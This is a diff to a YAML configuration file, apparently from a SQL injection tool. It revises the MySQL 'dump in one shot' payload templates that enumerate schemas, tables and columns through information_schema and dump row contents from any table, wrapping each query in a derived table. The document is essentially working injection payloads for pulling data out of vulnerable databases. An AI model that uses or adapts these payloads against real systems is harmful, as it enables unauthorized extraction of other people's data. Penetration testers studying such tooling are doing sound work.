@@ -141,48 +141,58 @@ resource:
 
  dios:
   database: |
-   select concat(@a:=0,(select count(*) from (
-       select concat(
-           ${enclose_value_hex},
-           cast(schema_name as char),
-           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
-       ) a
-       from information_schema.schemata
-   )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
+   select * from(
+       select concat(@a:=0,(select count(*) from (
+           select concat(
+               ${enclose_value_hex},
+               cast(schema_name as char),
+               '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
+           ) a
+           from information_schema.schemata 
+           order by 1
+       )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
+   )b
 
   table: |
-   select concat(@a:=0,(select count(*) from (
-       select concat(
-           ${enclose_value_hex},
-           cast(table_name as char),
-           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
-       ) a
-       from information_schema.tables
-       where table_schema = 0x${database.hex}
-   )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
+   select * from(
+       select concat(@a:=0,(select count(*) from (
+           select concat(
+               ${enclose_value_hex},
+               cast(table_name as char),
+               '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
+           ) a
+           from information_schema.tables
+           where table_schema = 0x${database.hex}
+           order by 1
+       )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
+   )b
 
   column: |
-   select concat(@a:=0,(select count(*) from (
-       select concat(
-           ${enclose_value_hex},
-           cast(column_name as char),
-           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
-       ) a
-       from information_schema.columns
-       where table_schema = 0x${database.hex}
-       and table_name = 0x${table.hex}
-   )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
+   select * from(
+       select concat(@a:=0,(select count(*) from (
+           select concat(
+               ${enclose_value_hex},
+               cast(column_name as char),
+               '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
+           ) a
+           from information_schema.columns
+           where table_schema = 0x${database.hex}
+           and table_name = 0x${table.hex}
+       )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
+   )b
 
   row:
    query: |
-          select concat(@a:=0,(select count(*) from (
-              select concat(
-                  ${enclose_value_hex},
-                  cast(concat(${fields}) as char),
-                  '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
-              ) a
-              from `${database}`.`${table}`
-          )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
+    select * from(
+        select concat(@a:=0,(select count(*) from (
+            select concat(
+                ${enclose_value_hex},
+                cast(concat(${fields}) as char),
+                '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
+            ) a
+            from `${database}`.`${table}`
+        )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
+    )b
    fields:
     field: trim(ifnull(`${field.value}`, 0x20))
     concat: ",0x7f,"
